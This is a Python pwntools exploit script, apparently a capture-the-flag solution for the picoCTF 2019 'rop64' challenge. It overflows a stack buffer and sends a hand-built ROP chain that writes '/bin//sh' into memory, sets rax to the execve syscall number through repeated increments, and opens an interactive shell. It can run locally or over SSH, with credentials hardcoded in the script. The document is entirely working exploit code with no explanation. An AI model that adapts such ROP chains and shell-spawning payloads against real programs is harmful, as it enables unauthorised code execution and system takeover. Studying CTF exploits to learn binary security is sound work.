import binascii
from pwn import *
import sys
from struct import pack


BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return pack('I', v)


def P64(v):
    return pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def start():
    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon', password="password")
        sh = s.process(
            'vuln', cwd='/problems/rop64_6_7b4c515f14d2b9bf173a78e711d404a7')
    else:
        sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


def main():
    sh = start()
    def send(x): return sh.sendlineafter('\n', x)

    p = "a"*(0x10+8)

    p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e0)  # @ .data
    p += pack('<Q', 0x00000000004156f4)  # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x000000000047f561)  # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
    p += pack('<Q', 0x0000000000444c50)  # xor rax, rax ; ret
    p += pack('<Q', 0x000000000047f561)  # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000400686)  # pop rdi ; ret
    p += pack('<Q', 0x00000000006b90e0)  # @ .data
    p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
    p += pack('<Q', 0x00000000004499b5)  # pop rdx ; ret
    p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
    p += pack('<Q', 0x0000000000444c50)  # xor rax, rax ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
    p += pack('<Q', 0x000000000047b6ff)  # syscall

    send(p)

    sh.interactive()


if __name__ == '__main__':
    main()
